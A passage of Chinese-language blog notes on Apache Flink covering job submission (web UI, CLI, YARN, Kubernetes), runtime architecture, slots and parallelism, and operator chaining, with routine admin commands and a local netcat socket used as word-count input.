Class<br>程序的入口，指定入口类（类的全限制名） </li><li> Program Arguments<br>程序启动参数，例如<code>--host localhost --port 7777</code> </li><li>Parallelism<br>设置Job并行度。<br>Ps：并行度优先级（从上到下优先级递减） <ul><li>代码中算子<code>setParallelism()</code></li><li><code>ExecutionEnvironment env.setMaxParallelism()</code></li><li>设置的Job并行度</li><li>集群conf配置文件中的<code>parallelism.default</code></li></ul></li></ul><p>ps：<strong>socket等特殊的IO操作，本身不能并行处理，并行度只能是1</strong></p><ul><li> Savepoint Path<br>savepoint是通过checkpoint机制为streaming job创建的一致性快照，比如数据源offset，状态等。<br>(savepoint可以理解为手动备份，而checkpoint为自动备份) </li></ul><p>ps：提交job要注意分配的slot总数是否足够使用，如果slot总数不够，那么job执行失败。（资源不够调度）</p><p>这里提交前面demo项目的StreamWordCount，在本地socket即<code>nc -lk 7777</code>中输入字符串，查看结果</p><p>输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world, and thank you!</span><br></pre></td></tr></table></figure><p>输出：</p><p>可以看出来输出的顺序并不是和输入的字符串严格相同的，因为是多个线程并行处理的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">1&gt;</span><span class="bash"> (world,,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (and,1)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (thank,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (you!,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (hello,1)</span></span><br></pre></td></tr></table></figure><h5 id="命令行提交job"><a href="#命令行提交job" class="headerlink" title="命令行提交job"></a>命令行提交job</h5><ol><li><p> 查看已提交的所有job  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/flink list</span>      </span><br><span class="line">Waiting for response...</span><br><span class="line">------------------ Running/Restarting Jobs -------------------</span><br><span class="line">30.01.2021 17:09:45 : 30d9dda946a170484d55e41358973942 : Flink Streaming Job (RUNNING)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">No scheduled jobs.</span><br></pre></td></tr></table></figure></li><li><p> 提交job </p></li></ol><ul><li><code>-c</code>指定入口类</li><li><code>-p</code>指定job的并行度</li></ul><p><code>bin/flink run -c &lt;入口类&gt; -p &lt;并行度&gt; &lt;jar包路径&gt; &lt;启动参数&gt;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/flink run -c wc.StreamWordCount -p 3 /tmp/Flink_Tutorial-1.0-SNAPSHOT.jar --host localhost --port 7777</span></span><br><span class="line">Job has been submitted with JobID 33a5d1f00688a362837830f0b85fd75e</span><br></pre></td></tr></table></figure><ol start="3"><li> 取消job<br><code>bin/flink cancel &lt;Job的ID&gt;</code>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/flink cancel 30d9dda946a170484d55e41358973942</span></span><br><span class="line">Cancelling job 30d9dda946a170484d55e41358973942.</span><br><span class="line">Cancelled job 30d9dda946a170484d55e41358973942.</span><br></pre></td></tr></table></figure></li></ol><p><strong>注：Total Task Slots只要不小于Job中Parallelism最大值即可。</strong></p><p>eg：这里我配置文件设置<code>taskmanager.numberOfTaskSlots: 4</code>，实际Job运行时总Tasks显示9，但是里面具体4个任务步骤分别需求（1，3，3，2）数量的Tasks，4&gt;3，满足最大的Parallelism即可运行成功。</p><h4 id="yarn模式"><a href="#yarn模式" class="headerlink" title="yarn模式"></a>yarn模式</h4><blockquote><p><a href="https://blog.csdn.net/suyebiubiu/article/details/111874245">4.6 Flink-流处理框架-Flink On Yarn（Session-cluster+Per-Job-Cluster）</a>    &lt;=    下面内容出自此处，主要方便索引图片URL</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以Yarn模式部署Flink任务时，要求Flink是有 Hadoop 支持的版本，Hadoop 环境需要保证版本在 2.2 以上，并且集群中安装有 HDFS 服务。</span><br></pre></td></tr></table></figure><h5 id="Flink-on-Yarn"><a href="#Flink-on-Yarn" class="headerlink" title="Flink on Yarn"></a>Flink on Yarn</h5><pre><code>Flink提供了两种在yarn上运行的模式，分别为Session-Cluster和Per-Job-Cluster模式。</code></pre><h6 id="Sesstion-Cluster模式"><a href="#Sesstion-Cluster模式" class="headerlink" title="Sesstion Cluster模式"></a>Sesstion Cluster模式</h6><pre><code>Session-Cluster 模式需要先启动集群，然后再提交作业，接着会向 yarn 申请一块空间后，**资源永远保持不变**。如果资源满了，下一个作业就无法提交，只能等到 yarn 中的其中一个作业执行完成后，释放了资源，下个作业才会正常提交。**所有作业共享 Dispatcher 和 ResourceManager**；**共享资源；适合规模小执行时间短的作业。**</code></pre><p><img src="https://img-blog.csdnimg.cn/20201228202616146.png###id=MBDhI&originHeight=183&originWidth=558&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>**在 yarn 中初始化一个 flink 集群，开辟指定的资源，以后提交任务都向这里提交。这个 flink 集群会常驻在 yarn 集群中，除非手工停止。**</code></pre><h6 id="Per-Job-Cluster-模式"><a href="#Per-Job-Cluster-模式" class="headerlink" title="Per Job Cluster 模式"></a>Per Job Cluster 模式</h6><pre><code>一个 Job 会对应一个集群，每提交一个作业会根据自身的情况，都会单独向 yarn 申请资源，直到作业执行完成，一个作业的失败与否并不会影响下一个作业的正常提交和运行。**独享 Dispatcher 和 ResourceManager**，按需接受资源申请；适合规模大长时间运行的作业。**每次提交都会创建一个新的 flink 集群，任务之间互相独立，互不影响，方便管理。任务执行完成之后创建的集群也会消失。**</code></pre><p><img src="https://img-blog.csdnimg.cn/20201228202718916.png###id=fMgvZ&originHeight=146&originWidth=548&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="Session-Cluster"><a href="#Session-Cluster" class="headerlink" title="Session Cluster"></a>Session Cluster</h5><ol><li> 启动_hadoop_集群（略） </li><li> 启动_yarn-session_<br>其中： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./yarn-session.sh -n 2 -s 2 -jm 1024 -tm 1024 -nm test -d</span><br></pre></td></tr></table></figure></li></ol><ul><li> <code>-n(--container)</code>：TaskManager的数量。 </li><li> <code>-s(--slots)</code>：每个TaskManager的slot数量，默认一个slot一个core，默认每个taskmanager的slot的个数为1，有时可以多一些taskmanager，做冗余。 </li><li> <code>-jm</code>：JobManager的内存（单位MB)。 </li><li> <code>-tm</code>：每个taskmanager的内存（单位MB)。 </li><li> <code>-nm</code>：yarn 的appName(现在yarn的ui上的名字)。 </li><li> <code>-d</code>：后台执行。 </li></ul><ol start="3"><li><p> 执行任务  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flink run -c com.atguigu.wc.StreamWordCount FlinkTutorial-1.0-SNAPSHOT-jar-with-dependencies.jar --host lcoalhost –port 7777</span><br></pre></td></tr></table></figure></li><li><p> 去 yarn 控制台查看任务状态<br><img src="https://img-blog.csdnimg.cn/20201228202911116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1N1eWViaXViaXU=,size_16,color_FFFFFF,t_70###id=dNjdi&originHeight=260&originWidth=685&originalType=binary&ratio=1&status=done&style=none"> </p></li><li><p> 取消 yarn-session  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn application --kill application_1577588252906_0001</span><br></pre></td></tr></table></figure></li></ol><h5 id="Per-Job-Cluster"><a href="#Per-Job-Cluster" class="headerlink" title="Per Job Cluster"></a>Per Job Cluster</h5><ol><li> 启动_hadoop_集群（略） </li><li> 不启动<strong>yarn-session</strong>，直接执行_job_  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flink run –m yarn-cluster -c com.atguigu.wc.StreamWordCount FlinkTutorial-1.0-SNAPSHOT-jar-with-dependencies.jar --host lcoalhost –port 7777</span><br></pre></td></tr></table></figure></li></ol><h4 id="Kubernetes部署"><a href="#Kubernetes部署" class="headerlink" title="Kubernetes部署"></a>Kubernetes部署</h4><pre><code>容器化部署时目前业界很流行的一项技术，基于Docker镜像运行能够让用户更加方便地对应用进行管理和运维。容器管理工具中最为流行的就是Kubernetes（k8s），而Flink也在最近的版本中支持了k8s部署模式。</code></pre><ol><li> 搭建_Kubernetes_集群（略） </li><li> 配置各组件的_yaml_文件 </li></ol><pre><code>在k8s上构建Flink Session Cluster，需要将Flink集群的组件对应的docker镜像分别在k8s上启动，包括JobManager、TaskManager、JobManagerService三个镜像服务。每个镜像服务都可以从中央镜像仓库中获取。</code></pre><ol start="3"><li><p> 启动_Flink Session Cluster_  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 启动jobmanager-service 服务</span><br><span class="line">kubectl create -f jobmanager-service.yaml</span><br><span class="line">// 启动jobmanager-deployment服务</span><br><span class="line">kubectl create -f jobmanager-deployment.yaml</span><br><span class="line">// 启动taskmanager-deployment服务</span><br><span class="line">kubectl create -f taskmanager-deployment.yaml</span><br></pre></td></tr></table></figure></li><li><p> 访问_Flink UI_页面<br>集群启动后，就可以通过JobManagerServicers中配置的WebUI端口，用浏览器输入以下url来访问Flink UI页面了：<br><code>http://&#123;JobManagerHost:Port&#125;/api/v1/namespaces/default/services/flink-jobmanager:ui/proxy</code> </p></li></ol><h3 id="Flink运行架构"><a href="#Flink运行架构" class="headerlink" title="Flink运行架构"></a>Flink运行架构</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106321149">Flink-运行时架构中的四大组件|任务提交流程|任务调度原理|Slots和并行度中间的关系|数据流|执行图|数据得传输形式|任务链</a></p></blockquote><h4 id="Flink运行时的组件"><a href="#Flink运行时的组件" class="headerlink" title="Flink运行时的组件"></a>Flink运行时的组件</h4><pre><code>Flink运行时架构主要包括四个不同的组件，它们会在运行流处理应用程序时协同工作：</code></pre><ul><li><strong>作业管理器（JobManager）</strong></li><li><strong>资源管理器（ResourceManager）</strong></li><li><strong>任务管理器（TaskManager）</strong></li><li><strong>分发器（Dispatcher）</strong></li></ul><pre><code>因为Flink是用Java和Scala实现的，所以所有组件都会运行在Java虚拟机上。每个组件的职责如下：</code></pre><h5 id="作业管理器（JobManager）"><a href="#作业管理器（JobManager）" class="headerlink" title="作业管理器（JobManager）"></a>作业管理器（JobManager）</h5><pre><code>控制一个应用程序执行的主进程，也就是说，每个应用程序都会被一个不同的JobManager所控制执行。JobManager会先接收到要执行的应用程序，这个应用程序会包括：</code></pre><ul><li>作业图（JobGraph）</li><li>逻辑数据流图（logical dataflow graph）</li><li>打包了所有的类、库和其它资源的JAR包。</li></ul><pre><code>JobManager会把JobGraph转换成一个物理层面的数据流图，这个图被叫做“执行图”（ExecutionGraph），包含了所有可以并发执行的任务。**JobManager会向资源管理器（ResourceManager）请求执行任务必要的资源，也就是任务管理器（TaskManager）上的插槽（slot）。一旦它获取到了足够的资源，就会将执行图分发到真正运行它们的TaskManager上**。在运行过程中，JobManager会负责所有需要中央协调的操作，比如说检查点（checkpoints）的协调。</code></pre><h5 id="资源管理器（ResourceManager）"><a href="#资源管理器（ResourceManager）" class="headerlink" title="资源管理器（ResourceManager）"></a>资源管理器（ResourceManager）</h5><pre><code>主要负责管理任务管理器（TaskManager）的插槽（slot），TaskManger插槽是Flink中定义的处理资源单元。Flink为不同的环境和资源管理工具提供了不同资源管理器，比如YARN、Mesos、K8s，以及standalone部署。**当JobManager申请插槽资源时，ResourceManager会将有空闲插槽的TaskManager分配给JobManager**。如果ResourceManager没有足够的插槽来满足JobManager的请求，它还可以向资源提供平台发起会话，以提供启动TaskManager进程的容器。另外，**ResourceManager还负责终止空闲的TaskManager，释放计算资源**。</code></pre><h5 id="任务管理器（TaskManager）"><a href="#任务管理器（TaskManager）" class="headerlink" title="任务管理器（TaskManager）"></a>任务管理器（TaskManager）</h5><pre><code>Flink中的工作进程。通常在Flink中会有多个TaskManager运行，每一个TaskManager都包含了一定数量的插槽（slots）。**插槽的数量限制了TaskManager能够执行的任务数量**。启动之后，TaskManager会向资源管理器注册它的插槽；收到资源管理器的指令后，TaskManager就会将一个或者多个插槽提供给JobManager调用。JobManager就可以向插槽分配任务（tasks）来执行了。**在执行过程中，一个TaskManager可以跟其它运行同一应用程序的TaskManager交换数据**。</code></pre><h5 id="分发器（Dispatcher）"><a href="#分发器（Dispatcher）" class="headerlink" title="分发器（Dispatcher）"></a>分发器（Dispatcher）</h5><pre><code>可以跨作业运行，它为应用提交提供了REST接口。当一个应用被提交执行时，分发器就会启动并将应用移交给一个JobManager。由于是REST接口，所以Dispatcher可以作为集群的一个HTTP接入点，这样就能够不受防火墙阻挡。Dispatcher也会启动一个Web UI，用来方便地展示和监控作业执行的信息。_Dispatcher在架构中可能并不是必需的，这取决于应用提交运行的方式。_</code></pre><h4 id="任务提交流程"><a href="#任务提交流程" class="headerlink" title="任务提交流程"></a>任务提交流程</h4><pre><code>我们来看看当一个应用提交执行时，Flink的各个组件是如何交互协作的：</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524212126844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=JCsDl&originHeight=317&originWidth=1147&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>_ps：上图中7.指TaskManager为JobManager提供slots，8.表示JobManager提交要在slots中执行的任务给TaskManager。_上图是从一个较为高层级的视角来看应用中各组件的交互协作。如果部署的集群环境不同（例如YARN，Mesos，Kubernetes，standalone等），其中一些步骤可以被省略，或是有些组件会运行在同一个JVM进程中。具体地，如果我们将Flink集群部署到YARN上，那么就会有如下的提交流程：</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524212247873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=UW7B0&originHeight=422&originWidth=854&originalType=binary&ratio=1&status=done&style=none"></p><ol><li>Flink任务提交后，Client向HDFS上传Flink的Jar包和配置</li><li>之后客户端向Yarn ResourceManager提交任务，ResourceManager分配Container资源并通知对应的NodeManager启动ApplicationMaster</li><li>ApplicationMaster启动后加载Flink的Jar包和配置构建环境，去启动JobManager，之后<strong>JobManager向Flink自身的RM进行申请资源，自身的RM向Yarn 的ResourceManager申请资源(因为是yarn模式，所有资源归yarn RM管理)启动TaskManager</strong></li><li>Yarn ResourceManager分配Container资源后，由ApplicationMaster通知资源所在节点的NodeManager启动TaskManager</li><li>NodeManager加载Flink的Jar包和配置构建环境并启动TaskManager，TaskManager启动后向JobManager发送心跳包，并等待JobManager向其分配任务。</li></ol><h4 id="任务调度原理"><a href="#任务调度原理" class="headerlink" title="任务调度原理"></a>任务调度原理</h4><p><img src="https://img-blog.csdnimg.cn/20200524213145755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=dggTa&originHeight=491&originWidth=730&originalType=binary&ratio=1&status=done&style=none"></p><ol><li> 客户端不是运行时和程序执行的一部分，但它用于准备并发送dataflow(JobGraph)给Master(JobManager)，然后，客户端断开连接或者维持连接以等待接收计算结果。而Job Manager会产生一个执行图(Dataflow Graph) </li><li> 当 Flink 集群启动后，首先会启动一个 JobManger 和一个或多个的 TaskManager。由 Client 提交任务给 JobManager，JobManager 再调度任务到各个 TaskManager 去执行，然后 TaskManager 将心跳和统计信息汇报给 JobManager。TaskManager 之间以流的形式进行数据的传输。上述三者均为独立的 JVM 进程。 </li><li> Client 为提交 Job 的客户端，可以是运行在任何机器上（与 JobManager 环境连通即可）。提交 Job 后，Client 可以结束进程（Streaming的任务），也可以不结束并等待结果返回。 </li><li> JobManager 主要负责调度 Job 并协调 Task 做 checkpoint，职责上很像 Storm 的 Nimbus。从 Client 处接收到 Job 和 JAR 包等资源后，会生成优化后的执行计划，并以 Task 的单元调度到各个 TaskManager 去执行。 </li><li> TaskManager 在启动的时候就设置好了槽位数（Slot），每个 slot 能启动一个 Task，Task 为线程。从 JobManager 处接收需要部署的 Task，部署启动后，与自己的上游建立 Netty 连接，接收数据并处理。<br><em>注：如果一个Slot中启动多个线程，那么这几个线程类似CPU调度一样共用同一个slot</em> </li></ol><h5 id="TaskManger与Slots"><a href="#TaskManger与Slots" class="headerlink" title="TaskManger与Slots"></a>TaskManger与Slots</h5><p>要点：</p><ul><li> 考虑到Slot分组，所以实际运行Job时所需的Slot总数 = 每个Slot组中的最大并行度。<br>eg（1，1，2，1）,其中第一个归为组“red”、第二个归组“blue”、第三个和第四归组“green”，那么运行所需的slot即max（1）+max（1）+max（2，1） =  1+1+2  = 4 </li></ul><hr><p><img src="https://img-blog.csdnimg.cn/20200524213557113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=k2sK2&originHeight=242&originWidth=752&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>Flink中每一个worker(TaskManager)都是一个<strong>JVM</strong>进程，它可能会在独立的线程上执行一个或多个subtask。</li><li>为了控制一个worker能接收多少个task，worker通过task slot来进行控制（一个worker至少有一个task slot）。</li></ul><p><strong>上图这个每个子任务各自占用一个slot，可以在代码中通过算子的</strong><code>**.slotSharingGroup(&quot;组名&quot;)**</code>**指定算子所在的Slot组名，默认每一个算子的SlotGroup和上一个算子相同，而默认的SlotGroup就是”default”**。</p><p><strong>同一个SlotGroup的算子能共享同一个slot，不同组则必须另外分配独立的Slot。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200524214555469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=C6Rqj&originHeight=336&originWidth=726&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>默认情况下，Flink允许子任务共享slot，即使它们是不同任务的子任务（前提需要来自同一个Job）。这样结果是，<strong>一个slot可以保存作业的整个管道pipeline</strong>。 <ul><li> <strong>不同任务共享同一个Slot的前提：这几个任务前后顺序不同，如上图中Source和keyBy是两个不同步骤顺序的任务，所以可以在同一个Slot执行</strong>。 </li><li>一个slot可以保存作业的整个管道的好处： <ul><li>如果有某个slot执行完了整个任务流程，那么其他任务就可以不用继续了，这样也省去了跨slot、跨TaskManager的通信损耗（降低了并行度）</li><li>同时slot能够保存整个管道，使得整个任务执行健壮性更高，因为某些slot执行出异常也能有其他slot补上。</li><li>有些slot分配到的子任务非CPU密集型，有些则CPU密集型，如果每个slot只完成自己的子任务，将出现某些slot太闲，某些slot过忙的现象。</li></ul></li><li> <em>假设拆分的多个Source子任务放到同一个Slot，那么任务不能并行执行了=&gt;因为多个相同步骤的子任务需要抢占的具体资源相同，比如抢占某个锁，这样就不能并行。</em> </li></ul></li><li> Task Slot是静态的概念，是指TaskManager具有的并发执行能力，可以通过参数<code>taskmanager.numberOfTaskSlots</code>进行配置。<br><em>而并行度<strong>parallelism</strong>是动态概念，即<strong>TaskManager</strong>运行程序时实际使用的并发能力，可以通过参数</em><code>_parallelism.default_</code><em>进行配置。</em> </li></ul><pre><code>每个task slot表示TaskManager拥有资源的一个固定大小的子集。假如一个TaskManager有三个slot，那么它会将其管理的内存分成三份给各个slot。资源slot化意味着一个subtask将不需要跟来自其他job的subtask竞争被管理的内存，取而代之的是它将拥有一定数量的内存储备。**需要注意的是，这里不会涉及到CPU的隔离，slot目前仅仅用来隔离task的受管理的内存**。通过调整task slot的数量，允许用户定义subtask之间如何互相隔离。如果一个TaskManager一个slot，那将意味着每个task group运行在独立的JVM中（该JVM可能是通过一个特定的容器启动的），而一个TaskManager多个slot意味着更多的subtask可以共享同一个JVM。而在同一个JVM进程中的task将共享TCP连接（基于多路复用）和心跳消息。它们也可能共享数据集和数据结构，因此这减少了每个task的负载。</code></pre><h5 id="Slot和并行度"><a href="#Slot和并行度" class="headerlink" title="Slot和并行度"></a>Slot和并行度</h5><ol><li><strong>一个特定算子的 子任务（subtask）的个数被称之为其并行度（parallelism）</strong>，我们可以对单独的每个算子进行设置并行度，也可以直接用env设置全局的并行度，更可以在页面中去指定并行度。</li><li>最后，由于并行度是实际Task Manager处理task 的能力，而一般情况下，<strong>一个 stream 的并行度，可以认为就是其所有算子中最大的并行度</strong>，则可以得出<strong>在设置Slot时，在所有设置中的最大设置的并行度大小则就是所需要设置的Slot的数量。</strong>（如果Slot分组，则需要为每组Slot并行度最大值的和）</li></ol><p><img src="https://img-blog.csdnimg.cn/20200524215554488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=MN4uP&originHeight=361&originWidth=543&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/2020052421520496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Qa8pF&originHeight=605&originWidth=665&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200524215251380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=HhvA4&originHeight=446&originWidth=718&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>假设一共有3个TaskManager，每一个TaskManager中的分配3个TaskSlot，也就是每个TaskManager可以接收3个task，一共9个TaskSlot，如果我们设置`parallelism.default=1`，即运行程序默认的并行度为1，9个TaskSlot只用了1个，有8个空闲，因此，设置合适的并行度才能提高效率。_ps：上图最后一个因为是输出到文件，避免多个Slot（多线程）里的算子都输出到同一个文件互相覆盖等混乱问题，直接设置sink的并行度为1。_</code></pre><h5 id="程序和数据流（DataFlow）"><a href="#程序和数据流（DataFlow）" class="headerlink" title="程序和数据流（DataFlow）"></a>程序和数据流（DataFlow）</h5><p><img src="https://img-blog.csdnimg.cn/20200524215944234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Y3olq&originHeight=420&originWidth=622&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> <strong>所有的Flink程序都是由三部分组成的： Source 、Transformation 和 Sink。</strong> </li><li> Source 负责读取数据源，Transformation 利用各种算子进行处理加工，Sink 负责输出 </li></ul><p><img src="https://img-blog.csdnimg.cn/20200524220037630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=urxeo&originHeight=240&originWidth=643&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 在运行时，Flink上运行的程序会被映射成“逻辑数据流”（dataflows），它包含了这三部分 </li><li> 每一个dataflow以一个或多个sources开始以一个或多个sinks结束。dataflow类似于任意的有向无环图（DAG） </li><li> 在大部分情况下，程序中的转换运算（transformations）跟dataflow中的算子（operator）是一一对应的关系 </li></ul><h5 id="执行图（ExecutionGraph）"><a href="#执行图（ExecutionGraph）" class="headerlink" title="执行图（ExecutionGraph）"></a>执行图（<strong>ExecutionGraph</strong>）</h5><pre><code>由Flink程序直接映射成的数据流图是StreamGraph，也被称为**逻辑流图**，因为它们表示的是计算逻辑的高级视图。为了执行一个流处理程序，Flink需要将**逻辑流图**转换为**物理数据流图**（也叫**执行图**），详细说明程序的执行方式。</code></pre><ul><li>Flink 中的执行图可以分成四层：StreamGraph -&gt; JobGraph -&gt; ExecutionGraph -&gt; 物理执行图。 <ul><li> <strong>StreamGraph</strong>：是根据用户通过Stream API 编写的代码生成的最初的图。用来表示程序的拓扑结构。 </li><li> <strong>JobGraph</strong>：StreamGraph经过优化后生成了JobGraph，提交给JobManager 的数据结构。主要的优化为，将多个符合条件的节点chain 在一起作为一个节点，这样可以减少数据在节点之间流动所需要的序列化/反序列化/传输消耗。 </li><li> <strong>ExecutionGraph</strong>：JobManager 根据JobGraph 生成ExecutionGraph。ExecutionGraph是JobGraph的并行化版本，是调度层最核心的数据结构。 </li><li> 物理执行图：JobManager 根据ExecutionGraph 对Job 进行调度后，在各个TaskManager 上部署Task 后形成的“图”，并不是一个具体的数据结构。 </li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20200524220232635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=w1FC1&originHeight=605&originWidth=620&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="数据传输形式"><a href="#数据传输形式" class="headerlink" title="数据传输形式"></a>数据传输形式</h5><ul><li> 一个程序中，不同的算子可能具有不同的并行度 </li><li>算子之间传输数据的形式可以是 one-to-one (forwarding) 的模式也可以是redistributing 的模式，具体是哪一种形式，取决于算子的种类 <ul><li> <strong>One-to-one</strong>：stream维护着分区以及元素的顺序（比如source和map之间）。这意味着map 算子的子任务看到的元素的个数以及顺序跟 source 算子的子任务生产的元素的个数、顺序相同。<strong>map、fliter、flatMap等算子都是one-to-one的对应关系</strong>。 </li><li> <strong>Redistributing</strong>：stream的分区会发生改变。每一个算子的子任务依据所选择的transformation发送数据到不同的目标任务。例如，keyBy 基于 hashCode 重分区、而 broadcast 和 rebalance 会随机重新分区，这些算子都会引起redistribute过程，而 redistribute 过程就类似于 Spark 中的 shuffle 过程。 </li></ul></li></ul><h5 id="任务链（OperatorChains）"><a href="#任务链（OperatorChains）" class="headerlink" title="任务链（OperatorChains）"></a>任务链（OperatorChains）</h5><pre><code>Flink 采用了一种称为任务链的优化技术，可以在特定条件下减少本地通信的开销。为了满足任务链的要求，必须将两个或多个算子设为**相同的并行度**，并通过本地转发（local forward）的方式进行连接</code></pre><ul><li><strong>相同并行度</strong>的 <strong>one-to-one 操作</strong>，Flink 这样相连的算子链接在一起形成一个 task，原来的算子成为里面的 subtask <ul><li>并行度相同、并且是 one-to-one 操作，两个条件缺一不可</li></ul></li></ul><pre><code>**为什么需要并行度相同，因为若flatMap并行度为1，到了之后的map并行度为2，从flatMap到map的数据涉及到数据由于并行度map为2会往两个slot处理，数据会分散，所产生的元素个数和顺序发生的改变所以有2个单独的task，不能成为任务链**</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524220815415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=aOXT7&originHeight=509&originWidth=620&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>**如果前后任务逻辑上可以是OneToOne，且并行度一致，那么就能合并在一个Slot里**（并行度原本是多少就是多少，两者并行度一致）执行。</code></pre><ul><li>keyBy需要根据Hash值分配给不同slot执行，所以只能Hash，不能OneToOne。</li><li>逻辑上可OneToOne但是并行度不同，那么就会Rebalance，轮询形式分配给下一个任务的多个slot。</li></ul><hr><ul><li> <strong>代码中如果</strong><code>**算子.disableChaining()**</code><strong>，能够强制当前算子的子任务不参与任务链的合并，即不和其他Slot资源合并，但是仍然可以保留“Slot共享”的特性</strong>。 </li><li> <strong>如果</strong><code>**StreamExecutionEnvironment env.disableOperatorChaining()**</code><strong>则当前执行环境全局设置算子不参与”任务链的合并”。</strong> </li><li> <strong>如果</strong><code>**算子.startNewChain()**</code><strong>表示不管前面任务链合并与否，从当前算子往后重新计算任务链的合并。通常用于前面强制不要任务链合并，而当前往后又需要任务链合并的特殊场景。</strong> </li></ul><p><em>ps：如果</em><code>_算子.shuffle()_</code><em>，能够强制算子之后重分区到不同slot执行下一个算子操作，逻辑上也实现了任务不参与任务链合并=&gt;但是仅为“不参与任务链的合并”，这个明显不是最优解操作</em></p><blockquote><p><a href="https://blog.csdn.net/qq_31866793/article/details/102786249">Flink slotSharingGroup disableChain startNewChain 用法案例</a></p></blockquote><h3 id="Flink流处理API"><a href="#Flink流处理API" 